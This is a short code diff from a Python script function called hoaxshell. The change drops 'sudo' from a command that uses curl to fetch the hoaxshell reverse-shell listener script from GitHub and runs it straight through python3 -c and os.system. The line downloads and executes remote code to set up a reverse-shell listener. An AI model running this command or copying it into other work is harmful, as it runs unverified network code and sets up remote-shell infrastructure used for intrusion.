@@ -55,7 +55,7 @@ def hoaxshell():
             """
             print(cmd_command)
 
-            command = f'sudo python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t cmd-curl -p {PORT}'
+            command = f'python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t cmd-curl -p {PORT}'
             os.system(command)
 
         if select == "2" or select == "2":
